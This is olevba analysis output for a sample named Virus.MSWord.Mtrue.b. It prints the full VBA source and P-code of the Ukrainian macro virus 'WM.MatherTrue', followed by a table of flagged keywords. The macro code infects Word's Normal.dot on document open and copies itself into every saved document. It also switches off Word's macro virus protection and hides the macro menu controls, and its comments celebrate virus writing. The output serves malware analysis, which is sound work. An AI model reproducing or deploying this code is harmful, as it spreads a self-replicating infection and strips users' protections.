olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mtrue.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mtrue.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO MatherTrue.bas 
in file: Virus.MSWord.Mtrue.b - OLE stream: 'Macros/VBA/MatherTrue'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit

  Dim ResultFDoc As Boolean 'True если в активном документе есть модуль с именем Мname
  Dim ResultFTemplite As Boolean 'True если в Normal.Dot есть модуль с именем Мname
  Dim Path_Normal As String 'путь к Normal.Dot
  Dim Path_Doc As String 'путь к активному документу
  Dim I As Integer 'переменная для цикла
  Dim HowMach As Integer 'количество модулей в проекте
  Dim Doc As Boolean
  Dim N As Integer

  Public Const Mname As String = "MatherTrue" 'имя модуля, откуда брать код
  
'Вызываеться при нажатии на кнопку Organizer
Public Sub Organizer()
Attribute Organizer.VB_Description = "Макрос записан 31.03.99 33715351"
Attribute Organizer.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.DS"
           CommandBars("Visual Basic").Enabled = True
           With CommandBars("Macro")
             For I = 1 To .Controls.Count
                 .Controls(I).Enabled = False
             Next I
           End With
           ShowVisualBasicEditor = False
           Application.DisplayStatusBar = True
           With Options
                .VirusProtection = False
                .AllowFastSave = True
                .SaveInterval = 3
           End With
End Sub

'Вызываеться при нажатии на кнопку Macro
Public Sub ToolsMacro()
End Sub

'Вызываеться при создании нового документа (при запуске Word'а новый документ создаёться автоматически)
Public Sub AutoNew()
           Call Organizer
End Sub

'Вызываеться при активизации режима сохранения активного документа или шаблона (нажатии на кнопку "Сохранить")
Public Sub FileSave()
              Doc = False
              N = Len(ActiveDocument.Name)
           If N < 10 Then N = 1
           If N >= 10 And N <= 99 Then N = 2
           If N >= 99 And N <= 1000 Then N = 3
           If Mid(ActiveDocument.Name, 1, Len(ActiveDocument.Name) - N) = "Документ" Then Doc = True
           ShowVisualBasicEditor = True
           ResultFDoc = False
           If PrintPreview = False Then
              HowMach = Application.ActiveDocument.VBProject.VBComponents.Count
              For I = 1 To HowMach
                If Mname = Application.ActiveDocument.VBProject.VBComponents(I).Name Then ResultFDoc = True
              Next I
              If ResultFDoc <> True Then
                 Path_Normal = Application.NormalTemplate.FullName
                 Path_Doc = Application.ActiveDocument.FullName
                 Application.OrganizerCopy Source:=Path_Normal, Destination:=Path_Doc, Name:=Mname, Object:=wdOrganizerObjectProjectItems
                 Call Organizer
              End If
            If Doc = True Then Dialogs(wdDialogFileSaveAs).Show: Exit Sub
            ActiveDocument.Save
            End If
End Sub

'Вызываеться при активизации режима сохранения всех активных документов и/или шаблонов (нажатии на кнопку "Сохранить все")
Public Sub FileSaveAll()
           ShowVisualBasicEditor = False
           Call FileSave
End Sub

'Вызываеться при активизации режима печати с текущими установками
Public Sub FilePrintDefault()
           ShowVisualBasicEditor = False
         '  ActiveDocument.Content.InsertAfter Text:="Вот такая она правда-мамка, а против правды не попрёшь...Привет  Михайловой Юльке. Coded by DI°            WM.MatherTrue -  I see, i'm here, i'm conqure ..."
           ActiveDocument.PrintOut
End Sub

'Вызываеться при активизации диалогоого окна печати
Public Sub FilePrint()
           ShowVisualBasicEditor = False
        '   ActiveDocument.Content.InsertAfter Text:="Вот такая она правда-мамка, а против правды не попрёшь...Привет  Михайловой Юльке. Coded by DI°            WM.MatherTrue -  I see, i'm here, i'm conqure ... "
           Dialogs(wdDialogFilePrint).Show
End Sub

'Вызываеться при открытии документа/шаблона
'инсталяция кода в Normal.Dot
Public Sub AutoOpen()
           ResultFTemplite = False
           If PrintPreview = False Then
              HowMach = Application.NormalTemplate.VBProject.VBComponents.Count
              For I = 1 To HowMach
                If Mname = Application.NormalTemplate.VBProject.VBComponents(I).Name Then ResultFTemplite = True
              Next I
              If ResultFTemplite <> True Then
                 Path_Normal = Application.NormalTemplate.FullName
                 Path_Doc = Application.ActiveDocument.FullName
                 Application.OrganizerCopy Source:=Path_Doc, Destination:=Path_Normal, Name:=Mname, Object:=wdOrganizerObjectProjectItems
              End If
           End If
End Sub
' Destroyer Inc° Or PIPA's E&CS™ Company presented the
' MacroVirus WM.MatherTrue
' (C) CopyRight 16.04.1999 Ukrein Hmelnitsky
' WM.MatherTrue Was Make In Ms Offise (MS Word - 8.0)
' Hackers And VirusMakers All Country - UNITED !!!
' "Virus For PC, PC For Virus"
' Big Hy For VRV Virus Production™, Predator'S°,SNAKE,S@S,DM,AlexHelraiser  by Destroyer Inc °
' ДЕМБЕЛЬ не избежен !!!' АРИЯ бессмертна !!! АРИЯ The Best !!!
'
' #####      ######    #####    #######   ######     ####    #     #   ######   ######
' #    ##    #    #   #     #      #      #     #   #    #   #     #   #    #   #     #
' #     ##   # #      #            #      #     #   #    #   #     #   # #      #     #
' #      #   ###       #####       #      ######    #    #    #### #   ###      ######
' #     ##   # #            #      #      #  #      #    #         #   # #      #  #
' #    ##    #    #   #     #      #      #   #     #    #         #   #    #   #   #
' #####      ######    #####       #      #    #     ####     ####     ######   #    #
'
'
'         #######   #     #   #######   ##
'            #      ##    #   #     #   ##
'            #      # #   #   #
'            #      #  #  #   #
'            #      #   # #   #
'            #      #    ##   #
'         #######   #     #   #######
'
'

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Mtrue.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/MatherTrue - 9875 bytes
' Line #0:
' 	Option  (Explicit)
' Line #1:
' Line #2:
' 	Dim 
' 	VarDefn ResultFDoc (As Boolean)
' 	QuoteRem 0x001C 0x0039 "True если в активном документе есть модуль с именем Мname"
' Line #3:
' 	Dim 
' 	VarDefn ResultFTemplite (As Boolean)
' 	QuoteRem 0x0021 0x0031 "True если в Normal.Dot есть модуль с именем Мname"
' Line #4:
' 	Dim 
' 	VarDefn Path_Normal (As String)
' 	QuoteRem 0x001C 0x0011 "путь к Normal.Dot"
' Line #5:
' 	Dim 
' 	VarDefn Path_Doc (As String)
' 	QuoteRem 0x0019 0x001A "путь к активному документу"
' Line #6:
' 	Dim 
' 	VarDefn I (As Integer)
' 	QuoteRem 0x0013 0x0014 "переменная для цикла"
' Line #7:
' 	Dim 
' 	VarDefn HowMach (As Integer)
' 	QuoteRem 0x0019 0x001C "количество модулей в проекте"
' Line #8:
' 	Dim 
' 	VarDefn Doc (As Boolean)
' Line #9:
' 	Dim 
' 	VarDefn N (As Integer)
' Line #10:
' Line #11:
' 	Dim (Public Const) 
' 	LitStr 0x000A "MatherTrue"
' 	VarDefn Mname (As String)
' 	QuoteRem 0x002E 0x001C "имя модуля, откуда брать код"
' Line #12:
' Line #13:
' 	QuoteRem 0x0000 0x002B "Вызываеться при нажатии на кнопку Organizer"
' Line #14:
' 	FuncDefn (Public Sub Organizer())
' Line #15:
' 	LitVarSpecial (True)
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' Line #16:
' 	StartWithExpr 
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	With 
' Line #17:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	MemLdWith Controls 
' 	MemLd Count 
' 	For 
' Line #18:
' 	LitVarSpecial (False)
' 	Ld I 
' 	ArgsMemLdWith Controls 0x0001 
' 	MemSt Enabled 
' Line #19:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #20:
' 	EndWith 
' Line #21:
' 	LitVarSpecial (False)
' 	St ShowVisualBasicEditor 
' Line #22:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt DisplayStatusBar 
' Line #23:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #24:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #25:
' 	LitVarSpecial (True)
' 	MemStWith AllowFastSave 
' Line #26:
' 	LitDI2 0x0003 
' 	MemStWith SaveInterval 
' Line #27:
' 	EndWith 
' Line #28:
' 	EndSub 
' Line #29:
' Line #30:
' 	QuoteRem 0x0000 0x0027 "Вызываеться при нажатии на кнопку Macro"
' Line #31:
' 	FuncDefn (Public Sub ToolsMacro())
' Line #32:
' 	EndSub 
' Line #33:
' Line #34:
' 	QuoteRem 0x0000 0x0066 "Вызываеться при создании нового документа (при запуске Word'а новый документ создаёться автоматически)"
' Line #35:
' 	FuncDefn (Public Sub AutoNew())
' Line #36:
' 	ArgsCall (Call) Organizer 0x0000 
' Line #37:
' 	EndSub 
' Line #38:
' Line #39:
' 	QuoteRem 0x0000 0x006D "Вызываеться при активизации режима сохранения активного документа или шаблона (нажатии на кнопку "Сохранить")"
' Line #40:
' 	FuncDefn (Public Sub FileSave())
' Line #41:
' 	LitVarSpecial (False)
' 	St Doc 
' Line #42:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	FnLen 
' 	St N 
' Line #43:
' 	Ld N 
' 	LitDI2 0x000A 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St N 
' 	EndIf 
' Line #44:
' 	Ld N 
' 	LitDI2 0x000A 
' 	Ge 
' 	Ld N 
' 	LitDI2 0x0063 
' 	Le 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0002 
' 	St N 
' 	EndIf 
' Line #45:
' 	Ld N 
' 	LitDI2 0x0063 
' 	Ge 
' 	Ld N 
' 	LitDI2 0x03E8 
' 	Le 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	St N 
' 	EndIf 
' Line #46:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	FnLen 
' 	Ld N 
' 	Sub 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0008 "Документ"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Doc 
' 	EndIf 
' Line #47:
' 	LitVarSpecial (True)
' 	St ShowVisualBasicEditor 
' Line #48:
' 	LitVarSpecial (False)
' 	St ResultFDoc 
' Line #49:
' 	Ld PrintPreview 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #50:
' 	Ld Application 
' 	MemLd ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St HowMach 
' Line #51:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld HowMach 
' 	For 
' Line #52:
' 	Ld Mname 
' 	Ld I 
' 	Ld Application 
' 	MemLd ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St ResultFDoc 
' 	EndIf 
' Line #53:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #54:
' 	Ld ResultFDoc 
' 	LitVarSpecial (True)
' 	Ne 
' 	IfBlock 
' Line #55:
' 	Ld Application 
' 	MemLd NormalTemplate 
' 	MemLd FullName 
' 	St Path_Normal 
' Line #56:
' 	Ld Application 
' 	MemLd ActiveDocument 
' 	MemLd FullName 
' 	St Path_Doc 
' Line #57:
' 	Ld Path_Normal 
' 	ParamNamed Source 
' 	Ld Path_Doc 
' 	ParamNamed Destination 
' 	Ld Mname 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #58:
' 	ArgsCall (Call) Organizer 0x0000 
' Line #59:
' 	EndIfBlock 
' Line #60:
' 	Ld Doc 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' 	BoS 0x0000 
' 	ExitSub 
' 	EndIf 
' Line #61:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #62:
' 	EndIfBlock 
' Line #63:
' 	EndSub 
' Line #64:
' Line #65:
' 	QuoteRem 0x0000 0x0079 "Вызываеться при активизации режима сохранения всех активных документов и/или шаблонов (нажатии на кнопку "Сохранить все")"
' Line #66:
' 	FuncDefn (Public Sub FileSaveAll())
' Line #67:
' 	LitVarSpecial (False)
' 	St ShowVisualBasicEditor 
' Line #68:
' 	ArgsCall (Call) FileSave 0x0000 
' Line #69:
' 	EndSub 
' Line #70:
' Line #71:
' 	QuoteRem 0x0000 0x0040 "Вызываеться при активизации режима печати с текущими установками"
' Line #72:
' 	FuncDefn (Public Sub FilePrintDefault())
' Line #73:
' 	LitVarSpecial (False)
' 	St ShowVisualBasicEditor 
' Line #74:
' 	QuoteRem 0x0009 0x00C9 "  ActiveDocument.Content.InsertAfter Text:="Вот такая она правда-мамка, а против правды не попрёшь...Привет  Михайловой Юльке. Coded by DI°            WM.MatherTrue -  I see, i'm here, i'm conqure ...""
' Line #75:
' 	Ld ActiveDocument 
' 	ArgsMemCall PrintOut 0x0000 
' Line #76:
' 	EndSub 
' Line #77:
' Line #78:
' 	QuoteRem 0x0000 0x0032 "Вызываеться при активизации диалогоого окна печати"
' Line #79:
' 	FuncDefn (Public Sub FilePrint())
' Line #80:
' 	LitVarSpecial (False)
' 	St ShowVisualBasicEditor 
' Line #81:
' 	QuoteRem 0x0008 0x00CB "   ActiveDocument.Content.InsertAfter Text:="Вот такая она правда-мамка, а против правды не попрёшь...Привет  Михайловой Юльке. Coded by DI°            WM.MatherTrue -  I see, i'm here, i'm conqure ... ""
' Line #82:
' 	Ld wdDialogFilePrint 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #83:
' 	EndSub 
' Line #84:
' Line #85:
' 	QuoteRem 0x0000 0x002A "Вызываеться при открытии документа/шаблона"
' Line #86:
' 	QuoteRem 0x0000 0x001C "инсталяция кода в Normal.Dot"
' Line #87:
' 	FuncDefn (Public Sub AutoOpen())
' Line #88:
' 	LitVarSpecial (False)
' 	St ResultFTemplite 
' Line #89:
' 	Ld PrintPreview 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #90:
' 	Ld Application 
' 	MemLd NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St HowMach 
' Line #91:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld HowMach 
' 	For 
' Line #92:
' 	Ld Mname 
' 	Ld I 
' 	Ld Application 
' 	MemLd NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St ResultFTemplite 
' 	EndIf 
' Line #93:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #94:
' 	Ld ResultFTemplite 
' 	LitVarSpecial (True)
' 	Ne 
' 	IfBlock 
' Line #95:
' 	Ld Application 
' 	MemLd NormalTemplate 
' 	MemLd FullName 
' 	St Path_Normal 
' Line #96:
' 	Ld Application 
' 	MemLd ActiveDocument 
' 	MemLd FullName 
' 	St Path_Doc 
' Line #97:
' 	Ld Path_Doc 
' 	ParamNamed Source 
' 	Ld Path_Normal 
' 	ParamNamed Destination 
' 	Ld Mname 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #98:
' 	EndIfBlock 
' Line #99:
' 	EndIfBlock 
' Line #100:
' 	EndSub 
' Line #101:
' 	QuoteRem 0x0000 0x0035 " Destroyer Inc° Or PIPA's E&CS™ Company presented the"
' Line #102:
' 	QuoteRem 0x0000 0x0019 " MacroVirus WM.MatherTrue"
' Line #103:
' 	QuoteRem 0x0000 0x002B " (C) CopyRight 16.04.1999 Ukrein Hmelnitsky"
' Line #104:
' 	QuoteRem 0x0000 0x0034 " WM.MatherTrue Was Make In Ms Offise (MS Word - 8.0)"
' Line #105:
' 	QuoteRem 0x0000 0x0031 " Hackers And VirusMakers All Country - UNITED !!!"
' Line #106:
' 	QuoteRem 0x0000 0x001D " "Virus For PC, PC For Virus""
' Line #107:
' 	QuoteRem 0x0000 0x005D " Big Hy For VRV Virus Production™, Predator'S°,SNAKE,S@S,DM,AlexHelraiser  by Destroyer Inc °"
' Line #108:
' 	QuoteRem 0x0000 0x003E " ДЕМБЕЛЬ не избежен !!!' АРИЯ бессмертна !!! АРИЯ The Best !!!"
' Line #109:
' 	QuoteRem 0x0000 0x0000 ""
' Line #110:
' 	QuoteRem 0x0000 0x0055 " #####      ######    #####    #######   ######     ####    #     #   ######   ######"
' Line #111:
' 	QuoteRem 0x0000 0x0056 " #    ##    #    #   #     #      #      #     #   #    #   #     #   #    #   #     #"
' Line #112:
' 	QuoteRem 0x0000 0x0056 " #     ##   # #      #            #      #     #   #    #   #     #   # #      #     #"
' Line #113:
' 	QuoteRem 0x0000 0x0055 " #      #   ###       #####       #      ######    #    #    #### #   ###      ######"
' Line #114:
' 	QuoteRem 0x0000 0x0053 " #     ##   # #            #      #      #  #      #    #         #   # #      #  #"
' Line #115:
' 	QuoteRem 0x0000 0x0054 " #    ##    #    #   #     #      #      #   #     #    #         #   #    #   #   #"
' Line #116:
' 	QuoteRem 0x0000 0x0055 " #####      ######    #####       #      #    #     ####     ####     ######   #    #"
' Line #117:
' 	QuoteRem 0x0000 0x0000 ""
' Line #118:
' 	QuoteRem 0x0000 0x0000 ""
' Line #119:
' 	QuoteRem 0x0000 0x0029 "         #######   #     #   #######   ##"
' Line #120:
' 	QuoteRem 0x0000 0x0029 "            #      ##    #   #     #   ##"
' Line #121:
' 	QuoteRem 0x0000 0x001E "            #      # #   #   #"
' Line #122:
' 	QuoteRem 0x0000 0x001E "            #      #  #  #   #"
' Line #123:
' 	QuoteRem 0x0000 0x001E "            #      #   # #   #"
' Line #124:
' 	QuoteRem 0x0000 0x001E "            #      #    ##   #"
' Line #125:
' 	QuoteRem 0x0000 0x0024 "         #######   #     #   #######"
' Line #126:
' 	QuoteRem 0x0000 0x0000 ""
' Line #127:
' 	QuoteRem 0x0000 0x0000 ""
' Line #128:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Hex String|3qSQ                |33715351                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

